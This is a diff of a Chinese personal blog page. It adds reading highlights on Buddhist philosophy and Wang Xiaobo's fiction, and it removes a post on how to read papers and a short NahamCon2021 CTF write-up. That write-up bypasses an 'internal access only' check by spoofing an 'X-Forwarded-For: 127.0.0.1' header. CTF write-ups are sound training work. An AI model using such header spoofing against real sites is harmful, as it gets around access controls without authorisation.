+<li>您在位置 #2984-2986的标注 | 添加于 2021年4月22日星期四 上午3:46:39</li>
+</ul>
+<p>阿赖耶识就是众生的主体，也是轮回的主体。它承载着我们做过的种种业，也承受着相应的果报。当我们说一个人修行圆满的时候，这个圆满成佛的主体，就是他的阿赖耶识。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #2986-2990的标注 | 添加于 2021年4月22日星期四 上午3:47:13</li>
+</ul>
+<p>佛教不是说“无我”吗？你说有一个阿赖耶识在轮回中不灭，这不就是在说变相的“有我”吗？ 这个疑问确实很让人苦恼。唯识学的解决方式是，在阿赖耶识之外提出另一个“识”，叫作“末那识”。唯识学说，是这个末那识让我们产生了“我”的概念。末那识是由阿赖耶识产生的，这个末那识是虚幻的，是“空”的。我们应该破除掉末那识的假象，但阿赖耶识是实有的。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #3029-3031的标注 | 添加于 2021年4月22日星期四 上午6:21:50</li>
+</ul>
+<p>我们可以用一句话大略概括中观和唯识两学： 中观学主张，一切事物都是“空”的。 唯识学主张，除了阿赖耶识以外，一切事物都是“空”的，都是由阿赖耶识幻化而成的。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #3223-3224的标注 | 添加于 2021年4月22日星期四 上午8:06:14</li>
+</ul>
+<p>既然时间和空间只是人用来描述事物的概念，而不是客观的存在。那么，事物的本质一定是超越时间和空间概念的。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #3276-3277的标注 | 添加于 2021年4月22日星期四 上午8:08:15</li>
+</ul>
+<p>。 众生一念之间包含了三千世界，用术语来说，叫作“一念三千”</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #3302-3306的标注 | 添加于 2021年4月22日星期四 上午8:09:32</li>
+</ul>
+<p>而天台宗说“十界互具”，说“一念三千”，等于打破了十界之间的巨大的鸿沟。虽然天台在实践中，仍旧强调佛和众生的区别，强调人要成佛应该刻苦修行，但是起码在理论上，“一念”和十界之间是没有距离的。 而且，全世界的万物都包含在我自己的一念之间，可以让人体验到极大的自由。用劳思光先生的话说：“永远无限制亦无保证，凡可作圣，圣亦可堕凡，念念之间，自我随时升降。”[11]</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #3414-3417的标注 | 添加于 2021年4月22日星期四 上午8:27:27</li>
+</ul>
+<p>法师，是精通法理、善于辩论和文字工作的佛学家。对应“慧”。 律师，重视僧团戒律，能用刻苦的修行以身作则。对应“戒”。 禅师，重视通过禅定修行来领悟佛性。对应“定”。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #3571-3571的标注 | 添加于 2021年4月22日星期四 上午9:40:46</li>
+</ul>
+<p>慧能最重要的观点是：我们对佛性的一切基于理性的追求行为，都是执著和错误</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #3571-3572的标注 | 添加于 2021年4月22日星期四 上午9:41:08</li>
+</ul>
+<p>慧能最重要的观点是：我们对佛性的一切基于理性的追求行为，都是执著和错误。 说白了，所有传统的修行方式都是执著。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #3576-3577的标注 | 添加于 2021年4月22日星期四 上午9:41:52</li>
+</ul>
+<p>慧能说：“佛法在世间，不离世间觉。离世觅菩提，恰如求兔角。”</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #3579-3579的标注 | 添加于 2021年4月22日星期四 上午9:42:01</li>
+</ul>
+<p>慧能又说：“佛向性中作，莫向身外求。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #3628-3628的标注 | 添加于 2021年4月22日星期四 上午9:43:42</li>
+</ul>
+<p>“汝若坐佛，即是杀佛。若执坐相，非达其理。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #3646-3648的标注 | 添加于 2021年4月22日星期四 上午9:44:25</li>
+</ul>
+<p>佛经当然是记录真理的文字，这是慧能万万不能否定的。但慧能说： “诸佛妙理，非关文字。”[22] —我不是说佛经不好，我是说，佛经不重要。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #3676-3677的标注 | 添加于 2021年4月22日星期四 上午9:46:41</li>
+</ul>
+<p>那么禅宗该怎么对待佛经呢？ 大珠慧海说：“得意而忘言，悟理而遗教。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #3687-3688的标注 | 添加于 2021年4月22日星期四 下午11:50:45</li>
+</ul>
+<p>慧能说： “自性迷，即是众生。自性觉，即是佛。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #3709-3710的标注 | 添加于 2021年4月22日星期四 下午11:51:33</li>
+</ul>
+<p>按照宋本《坛经》的话说：“不舍生死而入涅槃，是顿悟。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #3752-3754的标注 | 添加于 2021年4月22日星期四 下午11:53:13</li>
+</ul>
+<p>青源惟信说： “老僧三十年前未参禅时，见山是山，见水是水。及至后来，亲见知识，有个入处。见山不是山，见水不是水。而今得个休歇处，依前见山是山，见水是水。”</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #3768-3769的标注 | 添加于 2021年4月22日星期四 下午11:53:58</li>
+</ul>
+<p>任性逍遥，随缘放旷。但尽凡心，别无圣解。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #3889-3893的标注 | 添加于 2021年4月22日星期四 下午11:56:59</li>
+</ul>
+<p>在这些回答中我们只看到一个共性，就是他们的答案都不按照理性规则来[102]。禅师们是在说，所有的理性思维都是错的，只有像他们的回答一样抛弃了理性思维，才能够领悟“佛法大意”。 我们可以说，禅师们的这些回答并不是用来告知答案的，而是用来阻止学生进行理性思考的。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #4127-4131的标注 | 添加于 2021年4月23日星期五 上午12:05:35</li>
+</ul>
+<p>这么说来，狂禅就好像是一个“高级慧根俱乐部”，只有自认为修行达到了足够境界的禅宗精英才能参加。在这个小俱乐部里，一切骂佛、触犯戒律的癫狂行为都可以发生。但是这些行为只能局限在这一小圈人里，不能公开行动、公开宣扬，否则仍旧是在触犯戒律。而一般人也不要轻易学习禅宗呵祖骂佛的行为，对佛性的领悟不够就硬要模仿，那无助于自己的学习，也是在触犯戒律。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #4620-4620的标注 | 添加于 2021年4月23日星期五 上午6:21:39</li>
+</ul>
+<p>中国百姓接受的佛教，其实是个“以儒家道德为基本原则”的佛教。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #4644-4648的标注 | 添加于 2021年4月23日星期五 上午6:23:04</li>
+</ul>
+<p>不过，和正确的废话比起来，更可气的是根本不正确的话。比如“佛说前世五百次回眸，才换来今生擦肩而过”。就请喜欢这句话的大哥大姐们想想，这事能成立么？一个回眸和擦肩次数为500比1的世界那得多么变态啊。而且从逻辑上说，回眸之前不得先擦个肩么？难道说为了保持这个比例，众生在每次擦肩以后，都得原地不动回眸500次才算完成任务么？ 您们在被自己感动之前，先过过脑子行么？</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #4648-4652的标注 | 添加于 2021年4月23日星期五 上午6:23:19</li>
+</ul>
+<p>这类伪装成禅宗的心灵小感悟能够广为流行，恰恰说明了大众喜欢的不是哲学思考，而是浅显易懂的人生格言。 听一个有趣的小故事，然后被告知一个一听就懂的小道理，然后就以为自己已经获得国学中精深的知识，提高内涵了。 这样的学习方式多美好啊！ 禅宗的理论，正好给偷懒者打开了一道方便的大门。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #5029-5034的标注 | 添加于 2021年4月25日星期日 上午12:48:30</li>
+</ul>
+<p>就像强大的唐帝国对外民族展开怀抱一样，饱受外族侵扰的宋帝国催生出强烈的民族主义情绪。儒生们对“夷夏之辨”尤为敏感。来自国外的佛教，成了这股民族情绪的牺牲品。 宋初的儒生就攻击佛教“灭君臣之道，绝父子之情，弃道德，悖礼乐，裂五常，迁四民之常居，毁中国之衣冠，去祖宗而祀夷狄”[1]。 这不过是千百年来的老生常谈，并没有新鲜的批评，只能算是发泄情绪而已。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #5078-5081的标注 | 添加于 2021年4月25日星期日 上午12:50:41</li>
+</ul>
+<p>朱熹在儒家学术史上具有很高的地位。但我们上中学的时候学程朱理学，似乎只记住了“存天理，灭人欲”一句，好像朱熹就因为是个道德变态才被后人推崇的。 这不对。 朱熹被推崇，是因为他为儒学建立了如同佛学一样的形而上学体系。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #5182-5183的标注 | 添加于 2021年4月25日星期日 上午2:03:15</li>
+</ul>
+<p>禅宗里有一句著名的话：“青青翠竹，皆是法身。郁郁黄花，无非般若</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #5220-5222的标注 | 添加于 2021年4月25日星期日 上午2:04:42</li>
+</ul>
+<p>佛教的终极真理是“佛性”，这个佛性是完全超越一切理性概念的，其中也包括道德概念。佛性是无所谓善和恶的，是超越了善和恶的，道德在佛性看来，是一种顿悟不彻底的执著。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #5340-5347的标注 | 添加于 2021年4月25日星期日 上午7:16:54</li>
+</ul>
+<p>到自由的价值，只是因为那时的儒家反动透顶，禁锢人性。李贽只不过反观自己的内心，就像发现人都有私心一样，发现自由的可贵，这有什么了不起的吗？ 了不起。 因为自由并非毫无争议的正确。 其根本原因在于，人是社会动物，需要群居，需要合作。群居与合作必然会给每个成员带来一些约束。只要是生活在社会里的人，除了独裁者本人外，其他人不可能主张绝对的自由，必然要和这个社会有妥协。我们平时讲的“自由”，其实是在讲应该妥协什么、应该跟谁妥协的问题。 所以“自由”并不是天生、无条件就正确的，假如你坚持这么认为的话，别人只要说一句：“别人也有杀你的自由吗？”你就无话可说了。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #5532-5534的标注 | 添加于 2021年4月25日星期日 上午8:10:46</li>
+</ul>
+<p>明末以死殉节的儒生是很多，可这么一帮不懂经济学政治学军事学农业学、只知道以死殉节的臣子，对帝国又有什么用呢？所以那时的儒生才批评理学家说：“平时袖手谈心性，临危一死报君王。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #5620-5622的标注 | 添加于 2021年4月25日星期日 上午8:13:39</li>
+</ul>
+<p>中国文化的传统是崇拜古人。古人就一定非常了不起，古人说过的话，一定蕴含着伟大的哲理。这传统实在是太强烈了，以至于就算古人说的是浅显的大白话，后人也非得在其中使劲挖掘出什么深刻的道理来。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #5691-5694的标注 | 添加于 2021年4月25日星期日 上午8:15:35</li>
+</ul>
+<p>朴实百姓们想看的，是故事发生实际的变化：主人公心里怎么想不重要，关键是要解决实际问题，让主角在现实中获得胜利。 这就是好莱坞电影的模式。 而真正的禅宗不改变任何实际事物，这是文艺片的模式。 只有酒足饭饱的知识分子才有精力去看文艺片，也只有酒足饭饱的知识分子才会喜欢禅宗。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #5695-5696的标注 | 添加于 2021年4月25日星期日 上午8:15:49</li>
+</ul>
+<p>文艺片和禅宗可以让人们不假任何万物，只靠精神上的运动就可以超越世俗的痛苦，平静对待世间万物。这很棒。但对于连饭都吃不饱的人来说，它们提供不了任何帮助。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #5698-5699的标注 | 添加于 2021年4月25日星期日 上午8:16:12</li>
+</ul>
+<p>他们不在乎佛学理论，他们想要的是生动形象的天堂许诺，想要立等可取的菩萨救苦救难。 他们需要求神拜佛。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #5931-5932的标注 | 添加于 2021年4月25日星期日 上午9:37:35</li>
+</ul>
+<p>意思是说，只要老百姓诚心诚意的念诵观世音菩萨的法号，就能得到上述众多好处。“性价比”如此之高，不难理解观世音菩萨为什么能成为中国最有名的神了。</p>
+<p>王小波时代三部曲系列（黄金时代+白银时代+青铜时代 套装共3册） (王小波)</p>
+<ul>
+<li>您在位置 #716-718的标注 | 添加于 2021年4月25日星期日 上午9:43:35</li>
+</ul>
+<p>那时节全班动了公愤，呐喊一声在我背后追赶。我奔过操场，逃向那根灰色的烟囱。后来校长出来走动，只见我高高爬在脚手梯上，迎着万里东风，敞开年轻的胸怀，高叫着：操你妈！谁敢上来我就一脚踹他下去！这好像是刚刚发生的事情。</p>
+<p>王小波时代三部曲系列（黄金时代+白银时代+青铜时代 套装共3册） (王小波)</p>
+<ul>
+<li>您在位置 #741-741的标注 | 添加于 2021年4月25日星期日 上午9:45:24</li>
+</ul>
+<p>社会是个大熔炉，可以改造各种各样的人，甚至王二。现在</p>
+<p>王小波时代三部曲系列（黄金时代+白银时代+青铜时代 套装共3册） (王小波)</p>
+<ul>
+<li>您在位置 #829-831的标注 | 添加于 2021年4月26日星期一 上午12:04:21</li>
+</ul>
+<p>我在实验室里踱步，忽然觉得生活很无趣，它好像是西藏的一种酷刑：把人用湿牛皮裹起来，放在阳光下曝晒。等牛皮干硬收缩，就把人箍得乌珠迸出。生活也如是：你一天天老下去，牛皮一天天紧起来。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #6363-6372的标注 | 添加于 2021年4月26日星期一 上午2:24:42</li>
+</ul>
+<p>佛教在刚刚出现的时候，有着很强的哲学性、学术性。释迦牟尼不认为自己是高高在上的佛，只把自己当作先于他人开启智慧的老师。这时的佛教的哲学味道更浓、理论更简洁：因果报应规律是客观存在的、不以神佛意志为转移；佛是众生的老师而不是统治者；个人要自己努力学习佛法而不能依赖仪式；不鼓励咒术、佛像这些外在的宗教形式。 但是随着佛教的发展，佛教的学术味道越来越淡，宗教味道越来越浓：越到后来越强调神佛的外力，观世音菩萨、净土信仰越来越受欢迎；认为因果报应可以通过宗教仪式来修改；强调符咒和仪式的力量，产生了密宗。佛教中带有超能力味道的“设定”也越来越多，一个普通工具念珠也成了神器，一个普通的结界也有了法力。既然神佛的外力强大，那么向神佛忏悔、求助就比自己修行更加有效。最后就演变成了，就算是刻苦学习佛理的僧人，也都同时兼修净土，因为后者的“性价比”更高。 从社会传播学的角度说，这是佛教作为一门大众宗教不得不做的妥协：在传播中，只有那些最容易修行的，给大众好处最多的教义才可能流传下去。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #6439-6439的标注 | 添加于 2021年4月26日星期一 上午2:27:12</li>
+</ul>
+<p>圣严法师说得好：“出家人要超度的主要对象，是活人而非死人。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #6617-6618的标注 | 添加于 2021年4月26日星期一 上午3:01:37</li>
+</ul>
+<p>这世上怎么会有善的神佛，只因为信众贫穷就降罪于他呢？</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #6917-6919的标注 | 添加于 2021年4月26日星期一 上午3:04:43</li>
+</ul>
+<p>各大宗教都说，自己是因为受到了神灵的护佑、揭示了人间的真理，所以才能如此兴盛。但是从上述发展史来看，这些教派之所以兴盛，只是因为他们的传教方式符合社会学规律，对大众最有说服力和吸引力，是因为他们的教义不会违背社会的主潮流。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #7084-7084的标注 | 添加于 2021年4月26日星期一 上午6:30:33</li>
+</ul>
+<p>人类的理性不能认识世界的真实面目，这是康德的哲学观。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #7076-7078的标注 | 添加于 2021年4月26日星期一 上午6:30:45</li>
+</ul>
+<p>理性思维是有局限的，这个观点我们已经重复很多遍了。 有很多我们认为“可能存在”的事物是我们永远不可能认识的。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #7158-7159的标注 | 添加于 2021年4月26日星期一 上午6:33:43</li>
+</ul>
+<p>凡事都有因缘，因缘未到，佛也不能左右众生的命运。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #7164-7168的标注 | 添加于 2021年4月26日星期一 上午6:34:15</li>
+</ul>
+<p>“道”就是超越了理性的真理。 “道”没有形状、没有声音、理性无法理解它[18]，无法描述它[19]。但这不是说“道”等于什么都没有，“道”只是一种我们无法描述的东西，本身还是存在的[20]。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #7210-7211的标注 | 添加于 2021年4月26日星期一 上午6:36:06</li>
+</ul>
+<p>从逻辑上讲，宇宙的起源必然是个最伟大的存在，但是我们一旦试图去思考，就感到头痛，感到想不清楚，感到不可言说。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #7238-7238的标注 | 添加于 2021年4月26日星期一 上午7:23:57</li>
+</ul>
+<p>假如有一天我发现整个世界都是一场大梦，我不会像唯物主义者那样惊慌失措，我对这一切都早有心理准备。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #7253-7256的标注 | 添加于 2021年4月26日星期一 上午7:31:33</li>
+</ul>
+<p>但是还有一些唯心主义者，他们认为我们不知道我们心灵中的印象来自何处，那么也就不觉得这些印象是可靠的。换句话说，我们不能证明我们的所见都不是幻觉，我们不能证明下一秒钟地球不会被未知的强大力量毁灭，我们不能证明自己的记忆没被修改过。所以下一秒钟发生什么，严格的说我们是不知道的。 这种唯心主义对控制未来的信心，是最小的。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #7287-7292的标注 | 添加于 2021年4月26日星期一 上午7:33:04</li>
+</ul>
+<p>他觉得他对这世界所做的一切，都没得到他设想中的结果，每次都出乎他意料的让他倒霉。他会觉得这世界太不可靠，对未来也毫无安全感——过去这么努力都得到这下场，现在老成这样，更不知道未来会有什么结果了。那么当他反省自己的时候，他会想，这辈子得到了什么呢？将来早晚有一天自己会浑身病痛的躺在病床上，满身屎尿，连移动身体的能力都没有，到了这个境地，有什么是他能有信心把握的呢？想来想去，只有一个：那就是他的精神世界。只有这个让他有安全感。茫茫世界都不可靠、都不真实，只有自己的精神，自己的信念才是唯一可靠的。这不就是主观唯心主义吗？</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #7293-7294的标注 | 添加于 2021年4月26日星期一 上午7:33:32</li>
+</ul>
+<p>佛教认为所有事物都是“无常”的观点，正好是在极端强调我们没有控制未来的能力。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #7310-7313的标注 | 添加于 2021年4月26日星期一 上午7:34:33</li>
+</ul>
+<p>唯物主义和唯心主义并不是完全对立的黑白两面，而是位于同一个坐标轴上，而且这个坐标轴是连续的。绝大部分人在这个坐标轴上不会位于端点，而是位于中间的某段。人们还会随着自己对控制未来的自信心的变化，随时改变在坐标轴上所处的位置。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/04/26/%E6%91%98%E6%8A%84-%E4%BD%9B%E7%A5%96%E9%83%BD%E8%AF%B4%E4%BA%86%E4%BA%9B%E4%BB%80%E4%B9%88/" data-id="ckob8gj4j0004hsus6z1j0173" data-title="摘抄-佛祖都说了些什么" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%91%98%E6%8A%84/" rel="tag">摘抄</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-密码学-构造可证明安全密码方案" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/03/31/%E5%AF%86%E7%A0%81%E5%AD%A6-%E6%9E%84%E9%80%A0%E5%8F%AF%E8%AF%81%E6%98%8E%E5%AE%89%E5%85%A8%E5%AF%86%E7%A0%81%E6%96%B9%E6%A1%88/" class="article-date">
@@ -1434,212 +2347,11 @@
 
 
   
-    <article id="post-论文学习-方法论" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/03/16/%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0-%E6%96%B9%E6%B3%95%E8%AE%BA/" class="article-date">
-  <time class="dt-published" datetime="2021-03-16T02:18:09.000Z" itemprop="datePublished">2021-03-16</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/03/16/%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0-%E6%96%B9%E6%B3%95%E8%AE%BA/">论文学习-方法论</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/109507465">https://zhuanlan.zhihu.com/p/109507465</a></p>
-<h1 id="步骤1：搜集阶段"><a href="#步骤1：搜集阶段" class="headerlink" title="步骤1：搜集阶段"></a>步骤1：搜集阶段</h1><p>先把跟你题目可能相关的论文收集个30~40篇，每篇都只读Abstract和Introduction，而不要读Main Body，只在必要时稍微参考以下后面的Illustrative example和Conclusion，直到能回到下面三个问题</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（2A） 在这个领域内最常被引述的方法有哪些</span><br><span class="line">（2B） 这些方法分为哪些主要的派别</span><br><span class="line">（2C） 每个角色派别的主要特色（优缺点）是什么</span><br><span class="line">（2D） 这个领域内大家认为重要的关键问题有哪些？有哪些特性是大家重视的优点？有哪些特性是大家在意的确点？这些优点于缺点通常在哪些应用场合会比较被重视？在哪些应用场合时比较不会被重视？</span><br></pre></td></tr></table></figure>
-<ol>
-<li>搜索review paper，下载相关论文，根据title和Abstract找较相关的30~40篇论文。</li>
-<li>读过该领域内30<del>40篇论文的Abstract和Introduction，（2A）和（2B）这两个问题。尤其要记得，当你阅读的目的是要回答（2A）和（2B）这两个问题时，你一定要先挑那些Introdution写的比较有观念的论文念（很多论文的Introduction写得像流水帐，没有观念，这种论文刚开始时不要去读它）。假如你读过30</del>40篇论文的Abstract和Introdution之后，还是回答不了（2C），先做下述工作。</li>
-<li>你根据（2A）的答案，把这领域内最常被引用的论文找齐，再把它们根据（2B）答案分成派别，每个派别按日期先后次序排好。然后，你每次只重新读一派别的Abstract和Introduction，照日期先后读，读的时候只企图回答这一个问题：这一派的倡议与主要诉求是什么？这样，你逐派逐派地把每一派的Abstract和Introduction给读完，总结出这一派主要的诉求、方法特色和优点（每一篇论文都回说出自己的优点，仔细阅读就不会漏掉）。</li>
-<li>再把这些论文拿出来，但是只读Introduction，认真回答下述问题：每篇论文对其它派别有什么批评？然后你把读到的重点逐一记录到各派别的缺点栏内。</li>
-<li>用这些论文测试看看你用来搜寻着领域论文的keywords到底掐不恰当，并且用修正过的keywords在搜寻一次论文，把这领域的主要文献补齐，也把原来30~40篇论文中后来发现关系较远的论文给筛选掉，只保留大概20篇左右确定跟你关系较近的文章<ol>
-<li>如果有把握，可以甚至删除一两个你不想用的派别（要有充分的理由），只保留两、三个派别（也要有充分的理由）继续做完以下的工作</li>
-</ol>
-</li>
-<li>通过以上程序，你就应该可以掌握到（2A）、（2B）和（2C）三个问题的答案。这时，你对该领域内主要方法、文献之间的关系算是相当熟稔了，但是你还是只仔细读完Abstract和Introdution而已，内文则只是泛泛读过。</li>
-<li>进一步回答（2D）问题</li>
-</ol>
-<h1 id="步骤2：深入阶段"><a href="#步骤2：深入阶段" class="headerlink" title="步骤2：深入阶段"></a>步骤2：深入阶段</h1><p>读main body</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（3A） 这篇论文的主要假设是什么，并评估一下这些假设在现实条件下有多容易（难）成立</span><br><span class="line">（3B） 在这些假设下，论文的好处是什么</span><br><span class="line">（3C） 好处表现在哪些公式哪些项目的简化上</span><br><span class="line">（3D） 这一派别的主要缺点有哪些</span><br></pre></td></tr></table></figure>
-<ol>
-<li>整篇论文详细的推导过程，你不需要看懂。<strong>除了三、五个关键的公式</strong>（最后在应用上要使用的公式，你可以从这里评估出这个方法使用上的方便程度或计算效率，以及在非理想情境下这些公式使用起来的可靠度或稳定性）之外，其它公式都看不懂也没关系，公式之间的恒等推导过程可以完全略过去。假如你要看公式，<strong>重点是看公式推导过程中引入的假设条件</strong>，而不是恒等式的转换。</li>
-<li>开始根据前述问题年论文之前，你应该先把这派别所有的论文都拿出来，逐篇粗略地浏览过去（不要勉强自己每篇获每行都弄到懂，而是<strong>轻松地读，能懂就懂，不懂就不懂</strong>），从中挑出容易念懂的papers，以及经常被引述的论文</li>
-<li>把这些论文照时间顺序先后依次念完。记得：你念的时候回答（3A）、（3B）、（3C）三个问题就好，不要念的太细</li>
-<li>应该把这一派别的主要发展过程，主要假设，主要理论依据以及主要的成果做一个完整的整理。其次你还要根据（2D）的答案以及这一派别的主要假设，进一步回答下一个问题：（3D）这一派别主要的缺点有哪些</li>
-<li>必须要回到这个方法的基本假设上去，以及他在应用时所使用的主要方法（resultant equations）去，凭自己的思考能力，并且参考（2C）和（2D）的答案，自己问问看，预测一下这个方法应该会用在哪些条件下（应用场合）表现优异，又会在哪些条件下（应用场合）出状况？根据猜测在检验一次simulation examples and/or experiments，看它的长处与短处是不是确实在这些examples中充分被检验，且充分表现出来。</li>
-<li>什么时候才需要弄懂一篇论文所有的恒等式推导过程，或者把整篇论文仔细读完?Never!你只需要把确定会用到的部分给完全搞懂就好，不确定会不会用到的部分，只需要了解它的主要点子就够了</li>
-</ol>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/03/16/%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0-%E6%96%B9%E6%B3%95%E8%AE%BA/" data-id="ckmol7ln10004z4usd8eo384c" data-title="论文学习-方法论" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0/" rel="tag">论文学习</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-CTF-wp-NahamCon2021" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/03/13/CTF-wp-NahamCon2021/" class="article-date">
-  <time class="dt-published" datetime="2021-03-13T02:03:19.000Z" itemprop="datePublished">2021-03-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/03/13/CTF-wp-NahamCon2021/">CTF-wp-NahamCon2021</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="Homeward-Bound"><a href="#Homeward-Bound" class="headerlink" title="Homeward Bound"></a>Homeward Bound</h1><p>访问页面，提示只能由内部访问</p>
-<p>改包，添加</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure>
-<p>得到flag</p>
-<h1 id="esab64"><a href="#esab64" class="headerlink" title="esab64"></a>esab64</h1><p>题目名提示，是翻转的base64</p>
-<p>下载后用sublime text打开</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mxWYntnZiVjMxEjY0kDOhZWZ4cjYxIGZwQmY2ATMxEzNlFjNl13X</span><br></pre></td></tr></table></figure>
-<p>翻转后，使用base64解码</p>
-<p>再翻转，得到flag</p>
-<h1 id="veebee"><a href="#veebee" class="headerlink" title="veebee"></a>veebee</h1><p>下载附件运行即可</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/03/13/CTF-wp-NahamCon2021/" data-id="ckmadesnj0002y0us4kpe8jbu" data-title="CTF-wp-NahamCon2021" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-CTF-Web-SSTI" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/03/08/CTF-Web-SSTI/" class="article-date">
